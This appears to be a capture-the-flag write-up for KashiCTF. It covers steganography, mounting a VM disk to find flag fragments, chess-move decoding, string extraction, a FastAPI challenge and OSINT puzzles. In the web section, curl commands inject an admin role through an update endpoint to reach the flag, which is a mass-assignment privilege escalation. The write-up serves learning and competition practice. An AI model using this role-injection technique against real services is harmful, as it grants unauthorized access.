A friend of mine , Aakash has gone missing and the only thing we found is this poem...Weirdly, he had a habit of keeping his name as the password.

Given: `poemm.txt`

{{< figure src="image%2015.png" alt="image.png" >}}

Seeing white-spaces in here and also SNOW from the title of the challenge, it’s hinting on `stegsnow`.

After some trial and error, we reach a paste-bin link. 

```bash
└─$ stegsnow -p Aakash -C poemm.txt
https://pastebin.com/HVQfa14Z
```

{{< figure src="image%2016.png" alt="image.png" >}}

Instantly recognizing this as the `COW Esolang`.

[COW JavaScript implementation](https://frank-buss.de/cow.html)

Paste the input and hit execute.

{{< figure src="image%2017.png" alt="image.png" >}}

Flag: `KashiCTF{Love_Hurts_5734b5f}`

### **Self Destruct**

Explore the virtual machine and you might just find the flag. Or a surprise. Maybe....

**NOTE**: The attachment is a VirtualBox image. Do not run it outside VirtualBox. It is recommended to backup the .vdi file before launching the VM.

```bash
VM Parameters: (VirtualBox)

Type: Linux

Version: Debian (32 bits)

RAM: 1024MB

Storage: attached .vdi file
```

`Username: kashictf`

`Password: kashictf`

Firstly, let’s look at how to mount a VDI file.

<aside>
💡

A virtual disk image (VDI) is defined as **the image of a virtual hard disk or the logical disk associated with a virtual machine**. A virtual hard disk (VHD) is a disk image file format used to virtualize the contents of a computer's hard drive.

</aside>

Choose an existing Debian-based VM and open settings in `VirtualBox` [would be more or less similar in `VMWare`], Under Storage, find the `Controller: SATA` and add the VDI file under it.

{{< figure src="image%2018.png" alt="image.png" >}}

Fire up your VM and switch to root.

```bash
└──╼ #lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
sda      8:0    0   64G  0 disk 
├─sda1   8:1    0   50M  0 part /boot/efi
└─sda2   8:2    0 63.9G  0 part /home
                                /
sdb      8:16   0   10G  0 disk 
├─sdb1   8:17   0    9G  0 part /media/extradrive
├─sdb2   8:18   0    1K  0 part 
└─sdb5   8:21   0  975M  0 part 
sr0     11:0    1 1024M  0 rom 
```

Understanding the `lsblk` output, 

- `sda` (64GB) → Main **Parrot OS VM** storage.
- `sdb` (10GB) → An **additional virtual disk** (VDI file).

Now, the next step is optional but useful, checking the type of file system that the partition holds.

```bash
└──╼ #sudo blkid /dev/sdb1
/dev/sdb1: UUID="cd1fe922-f074-47a1-b6f9-d948b2616ab4" BLOCK_SIZE="4096" TYPE="ext4" PARTUUID="98443a49-01
```

We have an `ext4` file system in our hands, all that’s left is to mount it.

```bash
└──╼ $sudo mount /dev/sdb1 /media/extradrive
ls -la /media/extradrive
```

All that’s left is to search for flags, apparently their split into parts [7]. Time to dive in.

```bash
┌─[root@parrot]─[/media/extradrive/home/kashictf]
└──╼ #ls -la
total 28
drwx------ 2 user user 4096 Feb 20 14:57 .
drwxr-xr-x 3 root root 4096 Feb 20 12:29 ..
-rw------- 1 user user   41 Feb 20 13:52 .bash_history
-rw-r--r-- 1 user user  220 Feb 20 12:29 .bash_logout
-rw-r--r-- 1 user user 3526 Feb 20 12:29 .bashrc
-rw-r--r-- 1 user user  807 Feb 20 12:29 .profile
-rw-r--r-- 1 user user   41 Feb 20 14:56 .sush_history
┌─[root@parrot]─[/media/extradrive/home/kashictf]
└──╼ #cat .bash_history 
ls
echo "fLaG Part 5: 'ht??_No_Er'"
exit
```

Later on just grepping with `fLaG`.

```bash
└──╼ #grep -r "fLaG"
etc/sudo.conf:# fLaG Part 6: 'r0rs_4ll0w'
etc/hosts.allow:# fLaG Part 1: 'KashiCTF{r'
etc/kernel-img.conf:# Kernel image management overrides fLaG Part 4: 't_Am_1_Rig'
grep: usr/bin/sush: binary file matches
home/kashictf/.bash_history:echo "fLaG Part 5: 'ht??_No_Er'"
home/kashictf/.sush_history:echo "fLaG Part 3: 'eserve_roo'"
```

In order to find to part 2 and 7, we look at grep the entire directory again and pipe it to `xxd` to look at hex dumps as well. [that is if you overlooked the binary file like me HAHA]

```bash
└──╼ #grep -r "fLaG" /media/extradrive/ | xxd -r -p
grep: /media/extradrive/usr/bin/sush: binary file matches
```

Strings on the binary file, gives us the remaining parts.

```bash
fLaG Part 7: 'ed_Th0}'
fLaG Part 2: 'm_rf_no_pr'
```

Flag: `KashiCTF{rm_rf_no_preserve_root_Am_1_Right??_No_Err0rs_4ll0wed_Th0}`

### **FinalGame?**

We searched his room and found chess pieces thrown here and there ..thankfully someone recorded the entire game

`https://lichess.org/incUSy5k`

Instantly recognizing it was chess-based encryption, from the famous video.

[Storing Files in Chess Games for Free Cloud Storage](https://www.youtube.com/watch?v=TUtafoC4-7k)

[chessencryption](https://github.com/WintrCat/chessencryption)

But no, that wasn’t the way to go, then I completely changed in thinking it’s a tool-based challenge, then went on to analyzing the actual game, [was rated `1900` back then], couple of hours passed by and I had moved on from the challenge, then with nothing else to do, I came back, started looking for other chess tool, then this one came along and saved the day.

[chess-steg-cli](https://github.com/Alheimsins/chess-steg-cli)

```bash
└─$ chess-steg -u "1. b4 g6 2. e3 d5 3. Ne2 b5 4. Rg1 Bb7 5. c3 Qd7 6. Qb3 h6 7. Qd1 Qg4 8. Nf4 Nf6 9. Nh5 Qe4 10. Ng3 Qe5 11. Qf3 Bg7 12. Qh5 Ng4 13. c4 Qd6 14. cxb5 e6 15. Bb2 c6 16. Qxh6 Qd8 17. Bf6 Bxh6 18. Ne4 a6 19. Nec3 Bxe3 20. fxe3 Nf2 21. Rh1 Ne4 22. a4 Rh7 23. bxc6 Nf2 24. Bb5 Nxh1 25. Bh4 g5 26. Be2 Qc7 27. Bd3 Qa5 28. Bc4 Ra7 29. Na2 Qxa4 30. Nbc3 Nf2 31. Nd1 Rh6 32. Nc1 Qxc6 33. Ba2 Ng4 34. d4 Qc3+ 35. Kf1 Rf6+ 36. Kg1 Qc7 0-1"
KashiCTF{Will_This_Be_My_Last_Game_e94fab41}
```

## Reverse Engineering

### Game 1 - Untitled Game

We made a game.

Link: [driveLink](https://drive.google.com/file/d/1bf4WnxE81YIizN2e77x5PrkqGPwllgki/view?usp=drive_link)

Even though I love game hacking, sadly this one was just strings too.

{{< figure src="image%2019.png" alt="p4" >}}

```python
└─$ strings Challgame.exe | grep CTF
CTFq
var flag = "KashiCTF{N07_1N_7H3_G4M3}"  # Get the footstep audio
```

Apparently we need to input some password from the computer to get the flag.

{{< figure src="image%2020.png" alt="p4" >}}


Flag: `KashiCTF{N07_1N_7H3_G4M3}`

## Web Exploitation

### **SuperFastAPI**

Made my very first API!

However I have to still integrate it with a frontend so can't do much at this point lol.

```python
└─$ curl https://kashictf.iitbhucybersec.in:14808/
{"message":"Welcome to my SuperFastAPI. No frontend tho - visit sometime later :)"}
```

We’ve been given an `OpenAI` API that was a bit janky or maybe it’s just skill-issue. 
This challenge is an **API enumeration and exploitation** task, where you need to interact with a FastAPI-based web service to retrieve a flag.

You started by checking common API documentation endpoints:

- `/docs` (Swagger UI)
- `/redoc` (ReDoc)
- `/openapi.json` (OpenAPI spec)

```bash
{
  "openapi": "3.1.0",
  "info": {
    "title": "SuperFastAPI",
    "description": "Mt first API :)",
    "version": "1.0.0"
  },
  "paths": {
    "/": {
      "get": {
        "summary": "Root",
        "operationId": "root__get",
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          }
        }
      }
    },
    "/get/{username}": {
      "get": {
        "summary": "Get User",
        "operationId": "get_user_get__username__get",
        "parameters": [
          {
            "name": "username",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string",
              "title": "Username"
            }
          }
        ],
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    },
    "/create/{username}": {
      "post": {
        "summary": "Create User",
        "operationId": "create_user_create__username__post",
        "parameters": [
          {
            "name": "username",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string",
              "title": "Username"
            }
          }
        ],
        "requestBody": {
          "required": true,
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/UserCreate"
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    },
    "/update/{username}": {
      "put": {
        "summary": "Update User",
        "operationId": "update_user_update__username__put",
        "parameters": [
          {
            "name": "username",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string",
              "title": "Username"
            }
          }
        ],
        "requestBody": {
          "required": true,
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "title": "User Data"
              },
              "example": {
                "fname": "John",
                "lname": "Doe",
                "email": "john.doe@example.com",
                "gender": "male"
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    },
    "/flag/{username}": {
      "get": {
        "summary": "Get Flag",
        "operationId": "get_flag_flag__username__get",
        "parameters": [
          {
            "name": "username",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string",
              "title": "Username"
            }
          }
        ],
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    }
  },
  "components": {
    "schemas": {
      "HTTPValidationError": {
        "properties": {
          "detail": {
            "items": {
              "$ref": "#/components/schemas/ValidationError"
            },
            "type": "array",
            "title": "Detail"
          }
        },
        "type": "object",
        "title": "HTTPValidationError"
      },
      "UserCreate": {
        "properties": {
          "fname": {
            "type": "string",
            "title": "Fname"
          },
          "lname": {
            "type": "string",
            "title": "Lname"
          },
          "email": {
            "type": "string",
            "title": "Email"
          },
          "gender": {
            "type": "string",
            "title": "Gender"
          }
        },
        "type": "object",
        "required": [
          "fname",
          "lname",
          "email",
          "gender"
        ],
        "title": "UserCreate"
      },
      "ValidationError": {
        "properties": {
          "loc": {
            "items": {
              "anyOf": [
                {
                  "type": "string"
                },
                {
                  "type": "integer"
                }
              ]
            },
            "type": "array",
            "title": "Location"
          },
          "msg": {
            "type": "string",
            "title": "Message"
          },
          "type": {
            "type": "string",
            "title": "Error Type"
          }
        },
        "type": "object",
        "required": [
          "loc",
          "msg",
          "type"
        ],
        "title": "ValidationError"
      }
    }
  }
}
```

The `OpenAPI` JSON response revealed the available routes, including:

- `GET /get/{username}` → Retrieves user details
- `POST /create/{username}` → Creates a new user
- `PUT /update/{username}` → Updates user details
- `GET /flag/{username}` → Fetches a flag for a given username (likely the target)

Here’s the work-flow, create-user → update role → get flag.

```bash
└─$ curl -X POST "https://kashictf.iitbhucybersec.in:26096/create/hacker"      
-H "Content-Type: application/json"      -d '{
"fname":"John","lname":"Doe","email":"john.doe@example.com","gender":"male"}'
{"message":"User created!"}
┌──(abu㉿Abuntu)-[/mnt/c]
└─$ curl -X PUT "https://kashictf.iitbhucybersec.in:26096/update/hacker"   
-H "Content-Type: application/json"   -d '{"fname":"John","lname":"Doe","email":"john.doe@example.com","gender":"admin"}'
{"message":"User created!"}
┌──(abu㉿Abuntu)-[/mnt/c]
└─$ curl -X PUT "https://kashictf.iitbhucybersec.in:26096/update/hacker" \
  -H "Content-Type: application/json" \    -d '{"fname":"John","lname":"Doe","email":"john.doe@example.com","role":"admin"}'
{"message":"User created!"}
# Yes! for some reason I had to do this twice maybe something with the gender/role attribute
┌──(abu㉿Abuntu)-[/mnt/c]
└─$ curl -X GET https://kashictf.iitbhucybersec.in:26096/flag/hacker
{"message":"KashiCTF{m455_4551gnm3n7_ftw_GutwgPbLC}"}
```

Flag: `KashiCTF{m455_4551gnm3n7_ftw_GutwgPbLC}`

## Open Source Intelligence

### **Old Diner**

My friend once visited this place that served ice cream with coke. He said he had the best Greek omlette of his life and called it a very American experience. Can you find the name of the diner and the amount he paid?

Flag Format: `KashiCTF{Name_of_Diner_Amount}`

**For clarification on the flag format** The diner's name is in title case with spaces replaced by underscores. The amount is without currency sign, and in decimal, correct to two decimal places, i.e. `KashiCTF{Full_Diner_Name_XX.XX}`

For this challenge, finding the diner in question is quite easy, as I instantly got what they were referring as it’s common if you’re some what active in social media.

[Lexington Candy Shop · 1226 Lexington Ave, New York, NY 10028](https://maps.app.goo.gl/ZgqHZGLtQQ8eF9DJ7)

It’s indeed `Lexington Candy Shop`.

The real challenge comes in finding the bill. At first, we all would instinctively look for the menu for Greek Omlette.

{{< figure src="image%2021.png" alt="image.png" >}}

Which will about to either `17.95` or the WW Favorite one with `19.50`, but both of them are incorrect. Then I about looking at different platforms like Instagram, Twitter, Facebook, looking at different reviews and keeping and eye out for Greek Omlette. Nothing good turned up. Anyways here are some kind-off interesting finds.

{{< figure src="image%2022.png" alt="image.png" >}}

[Lexington Candy Shop on Twitter / X](https://x.com/LexingtonCandy/status/1433747117068193792)

Still nothing, and here is where most of us would’ve been stuck. Then big-wave, `Trip-Advisor`. This came to mind as, in the reviews apparently the waiters are rude to tourists and so on. And within 2 minutes of digging, found the target!

[LCS, New York City - Upper East Side - Menu, Prices & Restaurant Reviews - Tripadvisor](https://www.tripadvisor.in/Restaurant_Review-g60763-d522599-Reviews-Lexington_Candy_Shop-New_York_City_New_York.html)

Searching on the reviews with the keywork `Greek`, the very first review will get us the bill we’re looking for.

{{< figure src="image%2023.png" alt="p4" >}}

Right on with the challenge description, with the Greek Omlette and American experience.

{{< figure src="image%2024.png" alt="p4" >}}

In the check, we can see that the person had a total of `41.65` , which is the correct amount.

Flag: `KashiCTF{Lexington_Candy_Shop_41.65}`

### Kings

Did you know the cosmic weapons like this? I found similar example of such weapons on the net and it was even weirder. This ruler's court artist once drew the most accurate painting of a now extinct bird. Can you tell me the coordinates upto 4 decimal places of the place where this painting is right now.

Flag Format: `KashiCTF{XX.XXXX_YY.YYYY}`

{{< figure src="Weapon_1.jpg" alt="Weapon_1.jpg" >}}

[State Hermitage Museum · Palace Square, 2, St Petersburg, Russia, 190000](https://www.google.com/maps/place/hermitage+museum+russia/data=!4m2!3m1!1s0x4696310b32cbe2e9:0x74e032aa0505dfc?sa=X&ved=1t:155783&ictx=111)

Flag: `KashiCTF{59.9399_30.3149}`

Peace!
